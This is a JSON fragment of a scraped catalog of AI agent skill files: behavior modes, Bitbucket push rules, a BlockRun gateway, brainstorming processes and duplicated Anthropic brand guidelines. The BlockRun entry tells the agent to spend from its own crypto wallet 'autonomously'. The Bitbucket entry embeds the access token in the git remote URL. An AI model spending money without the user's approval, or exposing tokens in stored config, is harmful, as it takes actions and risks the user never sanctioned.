        "template"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:59.360Z"
    },
    {
      "id": "antigravity-behavioral-modes",
      "name": "behavioral-modes",
      "slug": "behavioral-modes",
      "description": "AI operational modes (brainstorm, implement, debug, review, teach, ship, orchestrate). Use to adapt behavior based on task type.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/behavioral-modes",
      "content": "\n# Behavioral Modes - Adaptive AI Operating Modes\n\n## Purpose\nThis skill defines distinct behavioral modes that optimize AI performance for specific tasks. Modes change how the AI approaches problems, communicates, and prioritizes.\n\n---\n\n## Available Modes\n\n### 1. 🧠 BRAINSTORM Mode\n\n**When to use:** Early project planning, feature ideation, architecture decisions\n\n**Behavior:**\n- Ask clarifying questions before assumptions\n- Offer multiple alternatives (at least 3)\n- Think divergently - explore unconventional solutions\n- No code yet - focus on ideas and options\n- Use visual diagrams (mermaid) to explain concepts\n\n**Output style:**\n```\n\"Let's explore this together. Here are some approaches:\n\nOption A: [description]\n  ✅ Pros: ...\n  ❌ Cons: ...\n\nOption B: [description]\n  ✅ Pros: ...\n  ❌ Cons: ...\n\nWhat resonates with you? Or should we explore a different direction?\"\n```\n\n---\n\n### 2. ⚡ IMPLEMENT Mode\n\n**When to use:** Writing code, building features, executing plans\n\n**Behavior:**\n- **CRITICAL: Use `clean-code` skill standards** - concise, direct, no verbose explanations\n- Fast execution - minimize questions\n- Use established patterns and best practices\n- Write complete, production-ready code\n- Include error handling and edge cases\n- **NO tutorial-style explanations** - just code\n- **NO unnecessary comments** - let code self-document\n- **NO over-engineering** - solve the problem directly\n- **NO RUSHING** - Quality > Speed. Read ALL references before coding.\n\n**Output style:**\n```\n[Code block]\n\n[Brief summary, max 1-2 sentences]\n```\n\n**NOT:**\n```\n\"Building [feature]...\n\n✓ Created [file1]\n✓ Created [file2]\n✓ Updated [file3]\n\n[long explanation]\n\nRun `npm run dev` to test.\"\n```\n\n---\n\n### 3. 🔍 DEBUG Mode\n\n**When to use:** Fixing bugs, troubleshooting errors, investigating issues\n\n**Behavior:**\n- Ask for error messages and reproduction steps\n- Think systematically - check logs, trace data flow\n- Form hypothesis → test → verify\n- Explain the root cause, not just the fix\n- Prevent future occurrences\n\n**Output style:**\n```\n\"Investigating...\n\n🔍 Symptom: [what's happening]\n🎯 Root cause: [why it's happening]\n✅ Fix: [the solution]\n🛡️ Prevention: [how to avoid in future]\n```\n\n---\n\n### 4. 📋 REVIEW Mode\n\n**When to use:** Code review, architecture review, security audit\n\n**Behavior:**\n- Be thorough but constructive\n- Categorize by severity (Critical/High/Medium/Low)\n- Explain the \"why\" behind suggestions\n- Offer improved code examples\n- Acknowledge what's done well\n\n**Output style:**\n```\n## Code Review: [file/feature]\n\n### 🔴 Critical\n- [issue with explanation]\n\n### 🟠 Improvements\n- [suggestion with example]\n\n### 🟢 Good\n- [positive observation]\n```\n\n---\n\n### 5. 📚 TEACH Mode\n\n**When to use:** Explaining concepts, documentation, onboarding\n\n**Behavior:**\n- Explain from fundamentals\n- Use analogies and examples\n- Progress from simple to complex\n- Include practical exercises\n- Check understanding\n\n**Output style:**\n```\n## Understanding [Concept]\n\n### What is it?\n[Simple explanation with analogy]\n\n### How it works\n[Technical explanation with diagram]\n\n### Example\n[Code example with comments]\n\n### Try it yourself\n[Exercise or task]\n```\n\n---\n\n### 6. 🚀 SHIP Mode\n\n**When to use:** Production deployment, final polish, release preparation\n\n**Behavior:**\n- Focus on stability over features\n- Check for missing error handling\n- Verify environment configs\n- Run all tests\n- Create deployment checklist\n\n**Output style:**\n```\n## Pre-Ship Checklist\n\n### ✅ Code Quality\n- [ ] No TypeScript errors\n- [ ] ESLint passing\n- [ ] All tests passing\n\n### ✅ Security\n- [ ] No exposed secrets\n- [ ] Input validation complete\n\n### ✅ Performance\n- [ ] Bundle size acceptable\n- [ ] No console.logs\n\n### 🚀 Ready to deploy\n```\n\n---\n\n## Mode Detection\n\nThe AI should automatically detect the appropriate mode based on:\n\n| Trigger | Mode |\n|---------|------|\n| \"what if\", \"ideas\", \"options\" | BRAINSTORM |\n| \"build\", \"create\", \"add\" | IMPLEMENT |\n| \"not working\", \"error\", \"bug\" | DEBUG |\n| \"review\", \"check\", \"audit\" | REVIEW |\n| \"explain\", \"how does\", \"learn\" | TEACH |\n| \"deploy\", \"release\", \"production\" | SHIP |\n\n---\n\n## Multi-Agent Collaboration Patterns (2025)\n\nModern architectures optimized for agent-to-agent collaboration:\n\n### 1. 🔭 EXPLORE Mode\n**Role:** Discovery and Analysis (Explorer Agent)\n**Behavior:** Socratic questioning, deep-dive code reading, dependency mapping.\n**Output:** `discovery-report.json`, architectural visualization.\n\n### 2. 🗺️ PLAN-EXECUTE-CRITIC (PEC)\nCyclic mode transitions for high-complexity tasks:\n1. **Planner:** Decomposes the task into atomic steps (`task.md`).\n2. **Executor:** Performs the actual coding (`IMPLEMENT`).\n3. **Critic:** Reviews the code, performs security and performance checks (`REVIEW`).\n\n### 3. 🧠 MENTAL MODEL SYNC\nBehavior for creating and loading \"Mental Model\" summaries to preserve context between sessions.\n\n---\n\n## Combining Modes\n\n---\n\n## Manual Mode Switching\n\nUsers can explicitly request a mode:\n\n```\n/bra",
      "tags": [
        "typescript",
        "ai",
        "agent",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:00.590Z"
    },
    {
      "id": "openhands-bitbucket",
      "name": "bitbucket",
      "slug": "bitbucket",
      "description": "You have access to an environment variable, `BITBUCKET_TOKEN`, which allows you to interact with",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/bitbucket.md",
      "content": "\nYou have access to an environment variable, `BITBUCKET_TOKEN`, which allows you to interact with\nthe Bitbucket API.\n\n<IMPORTANT>\nYou can use `curl` with the `BITBUCKET_TOKEN` to interact with Bitbucket's API.\nALWAYS use the Bitbucket API for operations instead of a web browser.\nALWAYS use the `create_bitbucket_pr` tool to open a pull request\n</IMPORTANT>\n\nIf you encounter authentication issues when pushing to Bitbucket (such as password prompts or permission errors), the old token may have expired. In such case, update the remote URL to include the current token: `git remote set-url origin https://x-token-auth:${BITBUCKET_TOKEN}@bitbucket.org/username/repo.git`\n\nHere are some instructions for pushing, but ONLY do this if the user asks you to:\n* NEVER push directly to the `main` or `master` branch\n* Git config (username and email) is pre-set. Do not modify.\n* You may already be on a branch starting with `openhands-workspace`. Create a new branch with a better name before pushing.\n* Use the `create_bitbucket_pr` tool to create a pull request, if you haven't already\n* Once you've created your own branch or a pull request, continue to update it. Do NOT create a new one unless you are explicitly asked to. Update the PR title and description as necessary, but don't change the branch name.\n* Use the main branch as the base branch, unless the user requests otherwise\n* After opening or updating a pull request, send the user a short message with a link to the pull request.\n* Do NOT mark a pull request as ready to review unless the user explicitly says so\n* Do all of the above in as few steps as possible. E.g. you could push changes with one step by running the following bash commands:\n```bash\ngit remote -v && git branch # to find the current org, repo and branch\ngit checkout -b create-widget && git add . && git commit -m \"Create widget\" && git push -u origin create-widget\n```\n",
      "tags": [
        "git",
        "bitbucket",
        "bash",
        "pr",
        "agent",
        "tool",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:27.844Z"
    },
    {
      "id": "antigravity-blockrun",
      "name": "blockrun",
      "slug": "blockrun",
      "description": "Use when user needs capabilities Claude lacks (image generation, real-time X/Twitter data) or explicitly requests external models (\"blockrun\", \"use grok\", \"use gpt\", \"dall-e\", \"deepseek\")",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/blockrun",
      "content": "\n# BlockRun\n\n**BlockRun works with Claude Code and Google Antigravity.**\n\nYou can't generate images. You have no real-time X/Twitter access. BlockRun gives you these capabilities.\n\n## Philosophy\n\nYou have a wallet. When you need a capability you lack, you pay for it autonomously.\n\n| You Need | You Call | Pricing |\n|----------|----------|---------|\n| Image generation | DALL-E | $0.04/image |\n| Real-time X data | Grok + Live Search | $0.025/source |\n| Second opinion | GPT-5.2 | $1.75/M input, $14/M output |\n| Cheaper processing | DeepSeek | $0.14/M input, $0.28/M output |\n\n**How it works:** BlockRun uses x402 micropayments to route your requests to OpenAI, xAI, Google, and other providers. No API keys needed - your wallet pays per token.\n\n## Budget Control (Optional)\n\nIf the user specifies a budget (e.g., \"use at most $1\"), track spending and stop when budget is reached:\n\n```python\nfrom blockrun_llm import setup_agent_wallet\n\nclient = setup_agent_wallet()\nbudget = 1.0  # User's budget\n\n# Before each call, check if within budget\nspending = client.get_spending()\nif spending['total_usd'] >= budget:\n    print(f\"Budget reached: ${spending['total_usd']:.4f} spent\")\n    # Stop making calls\nelse:\n    response = client.chat(\"openai/gpt-5.2\", \"Hello!\")\n\n# At the end, report spending\nspending = client.get_spending()\nprint(f\"💰 Total spent: ${spending['total_usd']:.4f} across {spending['calls']} calls\")\n```\n\n## When to Use\n\n| Trigger | Your Action |\n|---------|-------------|\n| User explicitly requests (\"blockrun second opinion with GPT on...\", \"use grok to check...\", \"generate image with dall-e\") | Execute via BlockRun |\n| User needs something you can't do (images, live X data) | Suggest BlockRun, wait for confirmation |\n| You can handle the task fine | Do it yourself, don't mention BlockRun |\n\n## Example User Prompts\n\nUsers will say things like:\n\n| User Says | What You Do |\n|-----------|-------------|\n| \"blockrun generate an image of a sunset\" | Call DALL-E via ImageClient |\n| \"use grok to check what's trending on X\" | Call Grok with `search=True` |\n| \"blockrun GPT review this code\" | Call GPT-5.2 via LLMClient |\n| \"what's the latest news about AI agents?\" | Suggest Grok (you lack real-time data) |\n| \"generate a logo for my startup\" | Suggest DALL-E (you can't generate images) |\n| \"blockrun check my balance\" | Show wallet balance via `get_balance()` |\n| \"blockrun deepseek summarize this file\" | Call DeepSeek for cost savings |\n\n## Wallet & Balance\n\nUse `setup_agent_wallet()` to auto-create a wallet and get a client. This shows the QR code and welcome message on first use.\n\n**Initialize client (always start with this):**\n```python\nfrom blockrun_llm import setup_agent_wallet\n\nclient = setup_agent_wallet()  # Auto-creates wallet, shows QR if new\n```\n\n**Check balance (when user asks \"show balance\", \"check wallet\", etc.):**\n```python\nbalance = client.get_balance()  # On-chain USDC balance\nprint(f\"Balance: ${balance:.2f} USDC\")\nprint(f\"Wallet: {client.get_wallet_address()}\")\n```\n\n**Show QR code for funding:**\n```python\nfrom blockrun_llm import generate_wallet_qr_ascii, get_wallet_address\n\n# ASCII QR for terminal display\nprint(generate_wallet_qr_ascii(get_wallet_address()))\n```\n\n## SDK Usage\n\n**Prerequisite:** Install the SDK with `pip install blockrun-llm`\n\n### Basic Chat\n```python\nfrom blockrun_llm import setup_agent_wallet\n\nclient = setup_agent_wallet()  # Auto-creates wallet if needed\nresponse = client.chat(\"openai/gpt-5.2\", \"What is 2+2?\")\nprint(response)\n\n# Check spending\nspending = client.get_spending()\nprint(f\"Spent ${spending['total_usd']:.4f}\")\n```\n\n### Real-time X/Twitter Search (xAI Live Search)\n\n**IMPORTANT:** For real-time X/Twitter data, you MUST enable Live Search with `search=True` or `search_parameters`.\n\n```python\nfrom blockrun_llm import setup_agent_wallet\n\nclient = setup_agent_wallet()\n\n# Simple: Enable live search with search=True\nresponse = client.chat(\n    \"xai/grok-3\",\n    \"What are the latest posts from @blockrunai on X?\",\n    search=True  # Enables real-time X/Twitter search\n)\nprint(response)\n```\n\n### Advanced X Search with Filters\n\n```python\nfrom blockrun_llm import setup_agent_wallet\n\nclient = setup_agent_wallet()\n\nresponse = client.chat(\n    \"xai/grok-3\",\n    \"Analyze @blockrunai's recent content and engagement\",\n    search_parameters={\n        \"mode\": \"on\",\n        \"sources\": [\n            {\n                \"type\": \"x\",\n                \"included_x_handles\": [\"blockrunai\"],\n                \"post_favorite_count\": 5\n            }\n        ],\n        \"max_search_results\": 20,\n        \"return_citations\": True\n    }\n)\nprint(response)\n```\n\n### Image Generation\n```python\nfrom blockrun_llm import ImageClient\n\nclient = ImageClient()\nresult = client.generate(\"A cute cat wearing a space helmet\")\nprint(result.data[0].url)\n```\n\n## xAI Live Search Reference\n\nLive Search is xAI's real-time data API. Cost: **$0.025 per source** (default 10 sources = ~$0.26).\n\nTo reduce costs, set `max_search_results` to a lower va",
      "tags": [
        "python",
        "api",
        "claude",
        "ai",
        "agent",
        "llm",
        "gpt",
        "document",
        "image",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:01.893Z"
    },
    {
      "id": "superpowers-brainstorming",
      "name": "brainstorming",
      "slug": "superpowers-brainstorming",
      "description": "You MUST use this before any creative work - creating features, building components, adding functionality, or modifying behavior. Explores user intent, requirements and design before implementation.",
      "category": "Collaboration & Project Management",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/brainstorming",
      "content": "\n# Brainstorming Ideas Into Designs\n\n## Overview\n\nHelp turn ideas into fully formed designs and specs through natural collaborative dialogue.\n\nStart by understanding the current project context, then ask questions one at a time to refine the idea. Once you understand what you're building, present the design in small sections (200-300 words), checking after each section whether it looks right so far.\n\n## The Process\n\n**Understanding the idea:**\n- Check out the current project state first (files, docs, recent commits)\n- Ask questions one at a time to refine the idea\n- Prefer multiple choice questions when possible, but open-ended is fine too\n- Only one question per message - if a topic needs more exploration, break it into multiple questions\n- Focus on understanding: purpose, constraints, success criteria\n\n**Exploring approaches:**\n- Propose 2-3 different approaches with trade-offs\n- Present options conversationally with your recommendation and reasoning\n- Lead with your recommended option and explain why\n\n**Presenting the design:**\n- Once you believe you understand what you're building, present the design\n- Break it into sections of 200-300 words\n- Ask after each section whether it looks right so far\n- Cover: architecture, components, data flow, error handling, testing\n- Be ready to go back and clarify if something doesn't make sense\n\n## After the Design\n\n**Documentation:**\n- Write the validated design to `docs/plans/YYYY-MM-DD-<topic>-design.md`\n- Use elements-of-style:writing-clearly-and-concisely skill if available\n- Commit the design document to git\n\n**Implementation (if continuing):**\n- Ask: \"Ready to set up for implementation?\"\n- Use superpowers:using-git-worktrees to create isolated workspace\n- Use superpowers:writing-plans to create detailed implementation plan\n\n## Key Principles\n\n- **One question at a time** - Don't overwhelm with multiple questions\n- **Multiple choice preferred** - Easier to answer than open-ended when possible\n- **YAGNI ruthlessly** - Remove unnecessary features from all designs\n- **Explore alternatives** - Always propose 2-3 approaches before settling\n- **Incremental validation** - Present design in sections, validate each\n- **Be flexible** - Go back and clarify when something doesn't make sense\n",
      "tags": [
        "testing",
        "git",
        "worktree",
        "brainstorming"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:10.504Z"
    },
    {
      "id": "antigravity-brainstorming",
      "name": "brainstorming",
      "slug": "brainstorming",
      "description": "Use this skill before any creative or constructive work (features, components, architecture, behavior changes, or functionality). This skill transforms vague ideas into validated designs through disciplined, incremental reasoning and collaboration.\n",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/brainstorming",
      "content": "\n# Brainstorming Ideas Into Designs\n\n## Purpose\n\nTurn raw ideas into **clear, validated designs and specifications**\nthrough structured dialogue **before any implementation begins**.\n\nThis skill exists to prevent:\n- premature implementation\n- hidden assumptions\n- misaligned solutions\n- fragile systems\n\nYou are **not allowed** to implement, code, or modify behavior while this skill is active.\n\n---\n\n## Operating Mode\n\nYou are operating as a **design facilitator and senior reviewer**, not a builder.\n\n- No creative implementation  \n- No speculative features  \n- No silent assumptions  \n- No skipping ahead  \n\nYour job is to **slow the process down just enough to get it right**.\n\n---\n\n## The Process\n\n### 1️⃣ Understand the Current Context (Mandatory First Step)\n\nBefore asking any questions:\n\n- Review the current project state (if available):\n  - files\n  - documentation\n  - plans\n  - prior decisions\n- Identify what already exists vs. what is proposed\n- Note constraints that appear implicit but unconfirmed\n\n**Do not design yet.**\n\n---\n\n### 2️⃣ Understanding the Idea (One Question at a Time)\n\nYour goal here is **shared clarity**, not speed.\n\n**Rules:**\n\n- Ask **one question per message**\n- Prefer **multiple-choice questions** when possible\n- Use open-ended questions only when necessary\n- If a topic needs depth, split it into multiple questions\n\nFocus on understanding:\n\n- purpose  \n- target users  \n- constraints  \n- success criteria  \n- explicit non-goals  \n\n---\n\n### 3️⃣ Non-Functional Requirements (Mandatory)\n\nYou MUST explicitly clarify or propose assumptions for:\n\n- Performance expectations  \n- Scale (users, data, traffic)  \n- Security or privacy constraints  \n- Reliability / availability needs  \n- Maintenance and ownership expectations  \n\nIf the user is unsure:\n\n- Propose reasonable defaults  \n- Clearly mark them as **assumptions**\n\n---\n\n### 4️⃣ Understanding Lock (Hard Gate)\n\nBefore proposing **any design**, you MUST pause and do the following:\n\n#### Understanding Summary\nProvide a concise summary (5–7 bullets) covering:\n- What is being built  \n- Why it exists  \n- Who it is for  \n- Key constraints  \n- Explicit non-goals  \n\n#### Assumptions\nList all assumptions explicitly.\n\n#### Open Questions\nList unresolved questions, if any.\n\nThen ask:\n\n> “Does this accurately reflect your intent?  \n> Please confirm or correct anything before we move to design.”\n\n**Do NOT proceed until explicit confirmation is given.**\n\n---\n\n### 5️⃣ Explore Design Approaches\n\nOnce understanding is confirmed:\n\n- Propose **2–3 viable approaches**\n- Lead with your **recommended option**\n- Explain trade-offs clearly:\n  - complexity\n  - extensibility\n  - risk\n  - maintenance\n- Avoid premature optimization (**YAGNI ruthlessly**)\n\nThis is still **not** final design.\n\n---\n\n### 6️⃣ Present the Design (Incrementally)\n\nWhen presenting the design:\n\n- Break it into sections of **200–300 words max**\n- After each section, ask:\n\n  > “Does this look right so far?”\n\nCover, as relevant:\n\n- Architecture  \n- Components  \n- Data flow  \n- Error handling  \n- Edge cases  \n- Testing strategy  \n\n---\n\n### 7️⃣ Decision Log (Mandatory)\n\nMaintain a running **Decision Log** throughout the design discussion.\n\nFor each decision:\n- What was decided  \n- Alternatives considered  \n- Why this option was chosen  \n\nThis log should be preserved for documentation.\n\n---\n\n## After the Design\n\n### 📄 Documentation\n\nOnce the design is validated:\n\n- Write the final design to a durable, shared format (e.g. Markdown)\n- Include:\n  - Understanding summary\n  - Assumptions\n  - Decision log\n  - Final design\n\nPersist the document according to the project’s standard workflow.\n\n---\n\n### 🛠️ Implementation Handoff (Optional)\n\nOnly after documentation is complete, ask:\n\n> “Ready to set up for implementation?”\n\nIf yes:\n- Create an explicit implementation plan\n- Isolate work if the workflow supports it\n- Proceed incrementally\n\n---\n\n## Exit Criteria (Hard Stop Conditions)\n\nYou may exit brainstorming mode **only when all of the following are true**:\n\n- Understanding Lock has been confirmed  \n- At least one design approach is explicitly accepted  \n- Major assumptions are documented  \n- Key risks are acknowledged  \n- Decision Log is complete  \n\nIf any criterion is unmet:\n- Continue refinement  \n- **Do NOT proceed to implementation**\n\n---\n\n## Key Principles (Non-Negotiable)\n\n- One question at a time  \n- Assumptions must be explicit  \n- Explore alternatives  \n- Validate incrementally  \n- Prefer clarity over cleverness  \n- Be willing to go back and clarify  \n- **YAGNI ruthlessly**\n\n---\nIf the design is high-impact, high-risk, or requires elevated confidence, you MUST hand off the finalized design and Decision Log to the `multi-agent-brainstorming` skill before implementation.\n",
      "tags": [
        "markdown",
        "ai",
        "agent",
        "workflow",
        "design",
        "document",
        "security",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:03.233Z"
    },
    {
      "id": "anthropic-brand-guidelines",
      "name": "brand-guidelines",
      "slug": "brand-guidelines",
      "description": "Applies Anthropic's official brand colors and typography to any sort of artifact that may benefit from having Anthropic's look-and-feel. Use it when brand colors or style guidelines, visual formatting, or company design standards apply.",
      "category": "Business & Marketing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/brand-guidelines",
      "content": "\n# Anthropic Brand Styling\n\n## Overview\n\nTo access Anthropic's official brand identity and style resources, use this skill.\n\n**Keywords**: branding, corporate identity, visual identity, post-processing, styling, brand colors, typography, Anthropic brand, visual formatting, visual design\n\n## Brand Guidelines\n\n### Colors\n\n**Main Colors:**\n\n- Dark: `#141413` - Primary text and dark backgrounds\n- Light: `#faf9f5` - Light backgrounds and text on dark\n- Mid Gray: `#b0aea5` - Secondary elements\n- Light Gray: `#e8e6dc` - Subtle backgrounds\n\n**Accent Colors:**\n\n- Orange: `#d97757` - Primary accent\n- Blue: `#6a9bcc` - Secondary accent\n- Green: `#788c5d` - Tertiary accent\n\n### Typography\n\n- **Headings**: Poppins (with Arial fallback)\n- **Body Text**: Lora (with Georgia fallback)\n- **Note**: Fonts should be pre-installed in your environment for best results\n\n## Features\n\n### Smart Font Application\n\n- Applies Poppins font to headings (24pt and larger)\n- Applies Lora font to body text\n- Automatically falls back to Arial/Georgia if custom fonts unavailable\n- Preserves readability across all systems\n\n### Text Styling\n\n- Headings (24pt+): Poppins font\n- Body text: Lora font\n- Smart color selection based on background\n- Preserves text hierarchy and formatting\n\n### Shape and Accent Colors\n\n- Non-text shapes use accent colors\n- Cycles through orange, blue, and green accents\n- Maintains visual interest while staying on-brand\n\n## Technical Details\n\n### Font Management\n\n- Uses system-installed Poppins and Lora fonts when available\n- Provides automatic fallback to Arial (headings) and Georgia (body)\n- No font installation required - works with existing system fonts\n- For best results, pre-install Poppins and Lora fonts in your environment\n\n### Color Application\n\n- Uses RGB color values for precise brand matching\n- Applied via python-pptx's RGBColor class\n- Maintains color fidelity across different systems\n",
      "tags": [
        "python",
        "pptx",
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:30.259Z"
    },
    {
      "id": "awesome-llm-brand-guidelines",
      "name": "brand-guidelines",
      "slug": "awesome-llm-brand-guidelines",
      "description": "Applies Anthropic's official brand colors and typography to any sort of artifact that may benefit from having Anthropic's look-and-feel. Use it when brand colors or style guidelines, visual formatting, or company design standards apply.",
      "category": "Business & Marketing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/brand-guidelines",
      "content": "\n# Anthropic Brand Styling\n\n## Overview\n\nTo access Anthropic's official brand identity and style resources, use this skill.\n\n**Keywords**: branding, corporate identity, visual identity, post-processing, styling, brand colors, typography, Anthropic brand, visual formatting, visual design\n\n## Brand Guidelines\n\n### Colors\n\n**Main Colors:**\n\n- Dark: `#141413` - Primary text and dark backgrounds\n- Light: `#faf9f5` - Light backgrounds and text on dark\n- Mid Gray: `#b0aea5` - Secondary elements\n- Light Gray: `#e8e6dc` - Subtle backgrounds\n\n**Accent Colors:**\n\n- Orange: `#d97757` - Primary accent\n- Blue: `#6a9bcc` - Secondary accent\n- Green: `#788c5d` - Tertiary accent\n\n### Typography\n\n- **Headings**: Poppins (with Arial fallback)\n- **Body Text**: Lora (with Georgia fallback)\n- **Note**: Fonts should be pre-installed in your environment for best results\n\n## Features\n\n### Smart Font Application\n\n- Applies Poppins font to headings (24pt and larger)\n- Applies Lora font to body text\n- Automatically falls back to Arial/Georgia if custom fonts unavailable\n- Preserves readability across all systems\n\n### Text Styling\n\n- Headings (24pt+): Poppins font\n- Body text: Lora font\n- Smart color selection based on background\n- Preserves text hierarchy and formatting\n\n### Shape and Accent Colors\n\n- Non-text shapes use accent colors\n- Cycles through orange, blue, and green accents\n- Maintains visual interest while staying on-brand\n\n## Technical Details\n\n### Font Management\n\n- Uses system-installed Poppins and Lora fonts when available\n- Provides automatic fallback to Arial (headings) and Georgia (body)\n- No font installation required - works with existing system fonts\n- For best results, pre-install Poppins and Lora fonts in your environment\n\n### Color Application\n\n- Uses RGB color values for precise brand matching\n- Applied via python-pptx's RGBColor class\n- Maintains color fidelity across different systems\n",
      "tags": [
        "python",
        "pptx",
        "ai",
        "design",
        "brand",
        "guidelines"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:40.293Z"
    },
    {
      "id": "antigravity-brand-guidelines-anthropic",
      "name": "brand-guidelines",
      "slug": "brand-guidelines-anthropic",
      "description": "Applies Anthropic's official brand colors and typography to any sort of artifact that may benefit from having Anthropic's look-and-feel. Use it when brand colors or style guidelines, visual formatting, or company design standards apply.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/brand-guidelines-anthropic",
      "content": "\n# Anthropic Brand Styling\n\n## Overview\n\nTo access Anthropic's official brand identity and style resources, use this skill.\n\n**Keywords**: branding, corporate identity, visual identity, post-processing, styling, brand colors, typography, Anthropic brand, visual formatting, visual design\n\n## Brand Guidelines\n\n### Colors\n\n**Main Colors:**\n\n- Dark: `#141413` - Primary text and dark backgrounds\n- Light: `#faf9f5` - Light backgrounds and text on dark\n- Mid Gray: `#b0aea5` - Secondary elements\n- Light Gray: `#e8e6dc` - Subtle backgrounds\n\n**Accent Colors:**\n\n- Orange: `#d97757` - Primary accent\n- Blue: `#6a9bcc` - Secondary accent\n- Green: `#788c5d` - Tertiary accent\n\n### Typography\n\n- **Headings**: Poppins (with Arial fallback)\n- **Body Text**: Lora (with Georgia fallback)\n- **Note**: Fonts should be pre-installed in your environment for best results\n\n## Features\n\n### Smart Font Application\n\n- Applies Poppins font to headings (24pt and larger)\n- Applies Lora font to body text\n- Automatically falls back to Arial/Georgia if custom fonts unavailable\n- Preserves readability across all systems\n\n### Text Styling\n\n- Headings (24pt+): Poppins font\n- Body text: Lora font\n- Smart color selection based on background\n- Preserves text hierarchy and formatting\n\n### Shape and Accent Colors\n\n- Non-text shapes use accent colors\n- Cycles through orange, blue, and green accents\n- Maintains visual interest while staying on-brand\n\n## Technical Details\n\n### Font Management\n\n- Uses system-installed Poppins and Lora fonts when available\n- Provides automatic fallback to Arial (headings) and Georgia (body)\n- No font installation required - works with existing system fonts\n- For best results, pre-install Poppins and Lora fonts in your environment\n\n### Color Application\n\n- Uses RGB color values for precise brand matching\n- Applied via python-pptx's RGBColor class\n- Maintains color fidelity across different systems\n",
      "tags": [
        "python",
        "pptx",
        "ai",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:04.405Z"
    },
    {
      "id": "antigravity-brand-guidelines-community",
      "name": "brand-guidelines",
      "slug": "brand-guidelines-community",
      "description": "Applies Anthropic's official brand colors and typography to any sort of artifact that may benefit from having Anthropic's look-and-feel. Use it when brand colors or style guidelines, visual formatting, or company design standards apply.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/brand-guidelines-community",
      "content": "\n# Anthropic Brand Styling\n\n## Overview\n\nTo access Anthropic's official brand identity and style resources, use this skill.\n\n**Keywords**: branding, corporate identity, visual identity, post-processing, styling, brand colors, typography, Anthropic brand, visual formatting, visual design\n\n## Brand Guidelines\n\n### Colors\n\n**Main Colors:**\n\n- Dark: `#141413` - Primary text and dark backgrounds\n- Light: `#faf9f5` - Light backgrounds and text on dark\n- Mid Gray: `#b0aea5` - Secondary elements\n- Light Gray: `#e8e6dc` - Subtle backgrounds\n\n**Accent Colors:**\n\n- Orange: `#d97757` - Primary accent\n- Blue: `#6a9bcc` - Secondary accent\n- Green: `#788c5d` - Tertiary accent\n\n### Typography\n\n- **Headings**: Poppins (with Arial fallback)\n- **Body Text**: Lora (with Georgia fallback)\n- **Note**: Fonts should be pre-installed in your environment for best results\n\n## Features\n\n### Smart Font Application\n\n- Applies Poppins font to headings (24pt and larger)\n- Applies Lora font to body text\n- Automatically falls back to Arial/Georgia if custom fonts unavailable\n- Preserves readability across all systems\n\n### Text Styling\n\n- Headings (24pt+): Poppins font\n- Body text: Lora font\n- Smart color selection based on background\n- Preserves text hierarchy and formatting\n\n### Shape and Accent Colors\n\n- Non-text shapes use accent colors\n- Cycles through orange, blue, and green accents\n- Maintains visual interest while staying on-brand\n\n## Technical Details\n\n### Font Management\n\n- Uses system-installed Poppins and Lora fonts when available\n- Provides automatic fallback to Arial (headings) and Georgia (body)\n- No font installation required - works with existing system fonts\n- For best results, pre-install Poppins and Lora fonts in your environment\n\n### Color Application\n\n- Uses RGB color values for precise brand matching\n- Applied via python-pptx's RGBColor class\n- Maintains color fidelity across different systems\n",
      "tags": [
        "python",
        "pptx",
        "ai",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:05.762Z"
    },
    {
      "id": "antigravity-broken-authentication",
      "name": "Broken Authentication Testing",
      "slug": "broken-authentication",
      "description": "This skill should be used when the user asks to \"test for broken authentication vulnerabilities\", \"assess session management security\", \"perform credential stuffing tests\", \"evaluate password policies\", \"test for session fixation\", or \"identify authentication bypass flaws\". It provides comprehensive",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/broken-authentication",
